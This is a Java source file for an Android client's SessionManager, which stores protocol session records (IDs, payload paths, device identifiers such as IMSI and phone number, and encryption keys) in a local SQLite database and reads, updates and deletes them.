package com.vvt.phoenix.prot.session;

import android.content.ContentValues;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.CommandRequest;
import com.vvt.phoenix.prot.command.CommandMetaData;

/**
 * @author tanakharn
 * Refactoring: January 2012
 */
public class SessionManager {
	
	/*
	 * Debugging
	 */
	private static final String TAG = "SessionManager";
	
	/*
	 * Constants
	 */
	private static final String DATABASE_NAME = "phoenix_db.db";
	
	/*
	 * Members
	 */
	private static String mDbPath;
	private static String mPayloadPath;
	private SQLiteDatabase mDb;
		
	public SessionManager(String sessionDbStorePath, String payloadStorePath){
		
		if(sessionDbStorePath.endsWith("/")){
			mDbPath = sessionDbStorePath + DATABASE_NAME;
		}else{
			mDbPath = sessionDbStorePath + "/" + DATABASE_NAME;
		}
		
		if(payloadStorePath.endsWith("/")){
			mPayloadPath = payloadStorePath;
		}else{
			mPayloadPath = payloadStorePath + "/";
		}
	}
	
	/* 
	 * Open Session Database.
	 * If there's no database it will create automatically.
	 * This method should be called only just after instance of 
	 * this class is initiated.
	 * 
	 * Throw SQLiteException if error.
	 * 
	 */
	public void openOrCreateSessionDatabase(){
		try{
			mDb = SQLiteDatabase.openOrCreateDatabase(mDbPath, null);
			mDb.execSQL(SessionDbSchema.SESSION_TABLE_CREATION);
			mDb.execSQL(SessionDbSchema.CSID_TABLE_CREATION);
			//for test handle open error
			/*if(true){
				throw new SQLiteException("Dummy Exception while open or create database");
			}*/
		}catch(SQLiteException e){
			FxLog.e(TAG, String.format("> openOrCreateSessionDatabase # %s", e.getMessage()));
			throw e;
		}
		FxLog.i(TAG, "> openOrCreateSessionDatabase # DONE");
	}
	
	public void closeSessionDatabase(){
		if(mDb != null){
			mDb.close();
			mDb = null;
		}
	}
	
	public SessionInfo createSession(CommandRequest commandRequest){
		SessionInfo session = new SessionInfo();
		long csid = generateCsid();
		session.setCsid(csid);
		session.setPayloadPath(generatePayloadPath(csid));
		session.setMetaData(commandRequest.getMetaData());
		session.setPayloadReady(false);
		
		return session;
	}

	private long generateCsid(){
		
		long csid = -1;
		Cursor c = null;
		try{
			c = mDb.query(SessionDbSchema.TABLE_CSID, null, null, null, null, null, null);
			//for test handling Exception in query step
			/*if(true){
				throw new Exception("Dummy Exception while query database");
			}*/
			//for test handling NULL Cursor
			//c = null;
			if(c != null){
				//1 increment CSID or begin counting CSID from the beginning
				if(c.getCount() != 0){
					c.moveToFirst();
					csid = c.getLong(c.getColumnIndex(SessionDbSchema.COLUMN_LATEST_CSID));
					FxLog.v(TAG, String.format("> generateCsid  # Latest CSID Value: %d", csid));
					csid++;
					FxLog.v(TAG, String.format("> generateCsid  # New CSID Value: %d", csid));
					
					//update CSID value
					ContentValues cv = new ContentValues();
					cv.put(SessionDbSchema.COLUMN_LATEST_CSID, csid);
					mDb.update(SessionDbSchema.TABLE_CSID, cv, null, null);		// Might throw IllegalArgumentException
					//for test hadling Exception in update state
					/*if(true){
						throw new Exception("Dummy Exception while update database");
					}*/
				}else{
					FxLog.v(TAG, "> generateCsid # No data in CSID table, let's generate first CSID value as 1");
					csid = 1;
					
					// insert first CSID value to DB
					ContentValues cv = new ContentValues();
					cv.put(SessionDbSchema.COLUMN_LATEST_CSID, csid);
					//for test insert error
					/*int insertId = -1;
					if(insertId == -1){*/
					if(mDb.insert(SessionDbSchema.TABLE_CSID, null, cv) == -1){
						FxLog.w(TAG, "> generateCsid # Cannot insert first CSID value into Session table, return CSID as -1");
						csid = -1;
					}
				}
				
			}else{
				FxLog.w(TAG, "> generateCsid # Cannot query CSID table, return CSID as -1");
			}
		}catch(Exception e){
			FxLog.e(TAG, String.format("> generateCsid # Got Exception:\n%s\nreturn CSID as -1", e.getMessage()));
			csid = -1;
		}finally{
			if(c != null){
				c.close();
			}
		}
		
		return csid;
	}

	private String generatePayloadPath(long csid){
		StringBuffer strBuf = new StringBuffer(mPayloadPath);
		strBuf.append(csid);
		strBuf.append(".prot");
		return strBuf.toString();
	}

	/**
	 * Persist new SessionInfo into Session database.
	 * @param session
	 * @return true if insert successfully, false if error.
	 * Might throw Runtime Exception
	 */
	public boolean persistSession(SessionInfo session){
		FxLog.d(TAG, "> persistSession");
		CommandMetaData meta = session.getMetaData();
		ContentValues cv = new ContentValues();
		cv.put(SessionDbSchema.COLUMN_CSID ,session.getCsid());
		cv.put(SessionDbSchema.COLUMN_READY_FLAG, session.isPayloadReady());
		cv.put(SessionDbSchema.COLUMN_PAYLOAD_PATH, session.getPayloadPath());
		cv.put(SessionDbSchema.COLUMN_PAYLOAD_SIZE, session.getPayloadSize());
		cv.put(SessionDbSchema.COLUMN_PAYLOAD_CRC, session.getPayloadCrc32());
		cv.put(SessionDbSchema.COLUMN_PUBLIC_KEY, session.getServerPublicKey());
		cv.put(SessionDbSchema.COLUMN_SSID, session.getSsid());
		cv.put(SessionDbSchema.COLUMN_AES_KEY, session.getAesKey());
		cv.put(SessionDbSchema.COLUMN_PROT_VER, meta.getProtocolVersion());
		cv.put(SessionDbSchema.COLUMN_PROD_ID, meta.getProductId());
		cv.put(SessionDbSchema.COLUMN_PROD_VER, meta.getProductVersion());
		cv.put(SessionDbSchema.COLUMN_CFG_ID, meta.getConfId()); 
		cv.put(SessionDbSchema.COLUMN_DEVICE_ID, meta.getDeviceId());
		cv.put(SessionDbSchema.COLUMN_ACTIVATE_CODE, meta.getActivationCode());
		cv.put(SessionDbSchema.COLUMN_LANGUAGE, meta.getLanguage());
		cv.put(SessionDbSchema.COLUMN_PHONE_NUMBER, meta.getPhoneNumber());
		cv.put(SessionDbSchema.COLUMN_MCC, meta.getMcc());
		cv.put(SessionDbSchema.COLUMN_MNC, meta.getMnc());
		cv.put(SessionDbSchema.COLUMN_IMSI, meta.getImsi());
		cv.put(SessionDbSchema.COLUMN_HOST_URL, meta.getHostUrl());
		cv.put(SessionDbSchema.COLUMN_ENCRYPTION_CODE, meta.getEncryptionCode());
		cv.put(SessionDbSchema.COLUMN_COMPRESS_CODE, meta.getCompressionCode());
		try{
			/*//for test handle insert error
			int rowId = -1;
			if(rowId != -1){*/
			if(mDb.insert(SessionDbSchema.TABLE_SESSION, null, cv) != -1){
				/*if(true){
					throw new IllegalStateException("Dummy Exception while inserting SessionInfo");
				}*/
				FxLog.i(TAG, "> persistSession # OK");
				return true;
			}else{
				FxLog.w(TAG, "> persistSession # Cannot insert Session into database (row ID = -1)");
				return false;
			}
		}catch(RuntimeException e){
			FxLog.e(TAG, String.format("> Exception while inserting new SessionInfo\n%s", e.getMessage()));
			throw e;
		}
		
	}
	
	/**
	 * Retrieve SessionInfo of the given CSID
	 * @param csid
	 * @return SessionInfo or null if no session for the given CSID or error occurs
	 */
	public SessionInfo getSession(long csid){
		FxLog.d(TAG, "> getSession");
		SessionInfo session = null;
		try{
			Cursor c = mDb.query(SessionDbSchema.TABLE_SESSION, null, SessionDbSchema.COLUMN_CSID + "=?", new String[]{String.valueOf(csid)}, null, null, null);
			/*//for test handle Exception
			if(true){
				throw new Exception("Dummy Exception while query session");
			}*/
			
			//for test handle NULL Cursor
			//c = null;
			if(c != null){
				if(c.getCount() != 0){
					c.moveToFirst();
					session = new SessionInfo();
					session.setCsid(c.getLong(c.getColumnIndex(SessionDbSchema.COLUMN_CSID)));
					int flag = c.getInt(c.getColumnIndex(SessionDbSchema.COLUMN_READY_FLAG));
					if(flag == 1){
						session.setPayloadReady(true);
					}else{
						session.setPayloadReady(false);
					}
					session.setPayloadPath(c.getString(c.getColumnIndex(SessionDbSchema.COLUMN_PAYLOAD_PATH)));
					session.setPayloadSize(c.getLong(c.getColumnIndex(SessionDbSchema.COLUMN_PAYLOAD_SIZE)));
					session.setPayloadCrc32(c.getLong(c.getColumnIndex(SessionDbSchema.COLUMN_PAYLOAD_CRC)));
					session.setServerPublicKey(c.getBlob(c.getColumnIndex(SessionDbSchema.COLUMN_PUBLIC_KEY)));
					session.setSsid(c.getLong(c.getColumnIndex(SessionDbSchema.COLUMN_SSID)));
					session.setAesKey(c.getBlob(c.getColumnIndex(SessionDbSchema.COLUMN_AES_KEY)));

					CommandMetaData meta = new CommandMetaData();
					meta.setProtocolVersion(c.getInt(c.getColumnIndex(SessionDbSchema.COLUMN_PROT_VER)));
					meta.setProductId(c.getInt(c.getColumnIndex(SessionDbSchema.COLUMN_PROD_ID)));
					meta.setProductVersion(c.getString(c.getColumnIndex(SessionDbSchema.COLUMN_PROD_VER)));
					meta.setConfId(c.getInt(c.getColumnIndex(SessionDbSchema.COLUMN_CFG_ID)));
					meta.setDeviceId(c.getString(c.getColumnIndex(SessionDbSchema.COLUMN_DEVICE_ID)));
					meta.setActivationCode(c.getString(c.getColumnIndex(SessionDbSchema.COLUMN_ACTIVATE_CODE)));
					meta.setLanguage(c.getInt(c.getColumnIndex(SessionDbSchema.COLUMN_LANGUAGE)));
					meta.setPhoneNumber(c.getString(c.getColumnIndex(SessionDbSchema.COLUMN_PHONE_NUMBER)));
					meta.setMcc(c.getString(c.getColumnIndex(SessionDbSchema.COLUMN_MCC)));
					meta.setMnc(c.getString(c.getColumnIndex(SessionDbSchema.COLUMN_MNC)));
					meta.setImsi(c.getString(c.getColumnIndex(SessionDbSchema.COLUMN_IMSI)));
					meta.setHostUrl(c.getString(c.getColumnIndex(SessionDbSchema.COLUMN_HOST_URL)));
					meta.setEncryptionCode(c.getInt(c.getColumnIndex(SessionDbSchema.COLUMN_ENCRYPTION_CODE)));
					meta.setCompressionCode(c.getInt(c.getColumnIndex(SessionDbSchema.COLUMN_COMPRESS_CODE)));
					
					session.setMetaData(meta);
				}else{
					FxLog.w(TAG, String.format("> getSession # No session data for CSID %d, return NULL", csid));
				}
				c.close();
				
				//for test handle Exception
				/*if(true){
					throw new Exception("Dummy Exception while query session");
				}*/
			}else{
				FxLog.w(TAG, "> getSession # Cannot query from session database, return session as NULL");
			}
		}catch(Exception e){
			FxLog.e(TAG, String.format("> getSession # Exception while retrieving session:\n%s\nReturn session as NULL", e.getMessage()));
			session = null;
		}
		
		FxLog.i(TAG, "> getSession # OK");
		return session;
	}
	
	/**
	 * Update session data
	 * @param session
	 * @return TRUE if update successfully, FALSE if the given session doesn't exist in database or some error occurs.
	 */
	public boolean updateSession(SessionInfo session){

		ContentValues cv = new ContentValues();
		cv.put(SessionDbSchema.COLUMN_CSID ,session.getCsid());
		cv.put(SessionDbSchema.COLUMN_READY_FLAG, session.isPayloadReady());
		cv.put(SessionDbSchema.COLUMN_PAYLOAD_PATH, session.getPayloadPath());
		cv.put(SessionDbSchema.COLUMN_PAYLOAD_SIZE, session.getPayloadSize());
		cv.put(SessionDbSchema.COLUMN_PAYLOAD_CRC, session.getPayloadCrc32());
		cv.put(SessionDbSchema.COLUMN_PUBLIC_KEY, session.getServerPublicKey());
		cv.put(SessionDbSchema.COLUMN_SSID, session.getSsid());
		cv.put(SessionDbSchema.COLUMN_AES_KEY, session.getAesKey());
		
		CommandMetaData meta = session.getMetaData();
		cv.put(SessionDbSchema.COLUMN_PROT_VER, meta.getProtocolVersion());
		cv.put(SessionDbSchema.COLUMN_PROD_ID, meta.getProductId());
		cv.put(SessionDbSchema.COLUMN_PROD_VER, meta.getProductVersion());
		cv.put(SessionDbSchema.COLUMN_CFG_ID, meta.getConfId()); 
		cv.put(SessionDbSchema.COLUMN_DEVICE_ID, meta.getDeviceId());
		cv.put(SessionDbSchema.COLUMN_ACTIVATE_CODE, meta.getActivationCode());
		cv.put(SessionDbSchema.COLUMN_LANGUAGE, meta.getLanguage());
		cv.put(SessionDbSchema.COLUMN_PHONE_NUMBER, meta.getPhoneNumber());
		cv.put(SessionDbSchema.COLUMN_MCC, meta.getMcc());
		cv.put(SessionDbSchema.COLUMN_MNC, meta.getMnc());
		cv.put(SessionDbSchema.COLUMN_IMSI, meta.getImsi());
		cv.put(SessionDbSchema.COLUMN_HOST_URL, meta.getHostUrl());
		cv.put(SessionDbSchema.COLUMN_ENCRYPTION_CODE, meta.getEncryptionCode());
		cv.put(SessionDbSchema.COLUMN_COMPRESS_CODE, meta.getCompressionCode());
		
		try{
			int rowUpdated = mDb.update(SessionDbSchema.TABLE_SESSION, cv, SessionDbSchema.COLUMN_CSID + "=?", new String[]{String.valueOf(session.getCsid())});
			//for test handle Exception
			/*if(true){
				throw new Exception("Dummy Exception while updating session");
			}*/
			if(rowUpdated > 0){
				FxLog.i(TAG, String.format("> updateSession # Number of row updated: %d, return TRUE", rowUpdated));
				return true;
			}else{
				FxLog.w(TAG, String.format("> updateSession # Number of row updated: %d, return FALSE", rowUpdated));
				return false;
			}
		}catch(Exception e){
			FxLog.e(TAG, String.format("> updateSession # %s", e.getMessage()));
			return false;
		}
	}
	
	/**
	 * Delete session with the given CSID
	 * @param csid
	 * @return TRUE if delete successfully, FALSE otherwise.
	 */
	public boolean deleteSession(long csid){
		try{
			int rowDeleted = mDb.delete(SessionDbSchema.TABLE_SESSION, SessionDbSchema.COLUMN_CSID + "=?", new String[]{String.valueOf(csid)});
			//for test handle Exception
			/*if(true){
				throw new Exception("Dummy Exception while deleting session");
			}*/
			if(rowDeleted > 0){
				FxLog.i(TAG, String.format("> deleteSession # Number of row deleted: %d, return TRUE", rowDeleted));
				return true;
			}else{
				FxLog.w(TAG, String.format("> deleteSession # Number of row deleted: %d, return FALSE", rowDeleted));
				return false;
			}
		}catch(Exception e){
			FxLog.e(TAG, String.format("> deleteSession # %s", e.getMessage()));
			return false;
		}
	}
	
	/**
	 * Query CSID of all session that the ready flag = TRUE : 
	 * The session of request that payload is already finished.
	 * @return pending CSID list or empty list if no pending session.
	 */
	public long[] getAllPendingSessionIds(){
		
		long[] result;
		try{
			Cursor c = mDb.query(SessionDbSchema.TABLE_SESSION, new String[]{String.valueOf(SessionDbSchema.COLUMN_CSID)}, 
					SessionDbSchema.COLUMN_READY_FLAG + "=?", new String[]{String.valueOf(1)}, null, null, null);
			//for test handle Exception
			/*if(true){
				throw new Exception("Dummy Exception while get all pending sessions");
			}*/
			//for test NULL Cursor
			//c = null;
			if(c != null){
				int rowCount = c.getCount();
				if(rowCount != 0){
					result = new long[rowCount];
					for(int i=0; i<rowCount; i++){
						c.moveToNext();
						result[i] = c.getLong(0);
					}
					FxLog.i(TAG, String.format("> getAllPendingSessionIds # Return %d CSIDs of all pending sessions", rowCount));
				}else{
					FxLog.v(TAG, "> getAllPendingSessionIds # No pending session, return empty list");
					result = new long[0];
				}
				c.close();
			}else{
				FxLog.w(TAG, "> getAllPendingSessionIds # Cannot query session table, return empty list");
				result = new long[0];
			}
		}catch(Exception e){
			FxLog.e(TAG, String.format("> getAllPendingSessionIds # %s", e.getMessage()));
			result = new long[0];
		}
		
		return result;
	}
	
	/**
	 * Query CSID of all session that the ready flag = FALSE : 
	 * The session of request that payload is not yet finished.
	 * @return pending CSID list or empty list if no pending session.
	 */
	public long[] getAllOrphanSessionIds(){
		long[] result;
		try{
			Cursor c = mDb.query(SessionDbSchema.TABLE_SESSION, new String[]{String.valueOf(SessionDbSchema.COLUMN_CSID)}, 
					SessionDbSchema.COLUMN_READY_FLAG + "=?", new String[]{String.valueOf(0)}, null, null, null);
			//for test handle Exception
			/*if(true){
				throw new Exception("Dummy Exception while get all orphan sessions");
			}*/
			//for test NULL Cursor
			//c = null;
			if(c != null){
				int rowCount = c.getCount();
				if(rowCount != 0){
					result = new long[rowCount];
					for(int i=0; i<rowCount; i++){
						c.moveToNext();
						result[i] = c.getLong(0);
					}
					FxLog.i(TAG, String.format("> getAllOrphanSessionIds # Return %d CSIDs of all orphan sessions", rowCount));
				}else{
					FxLog.v(TAG, "> getAllOrphanSessionIds # No orphan session, return empty list");
					result = new long[0];
				}
				c.close();
			}else{
				FxLog.w(TAG, "> getAllOrphanSessionIds # Cannot query session table, return empty list");
				result = new long[0];
			}
		}catch(Exception e){
			FxLog.e(TAG, String.format("> getAllOrphanSessionIds # %s", e.getMessage()));
			result = new long[0];
		}
		
		return result;
	}
	
}
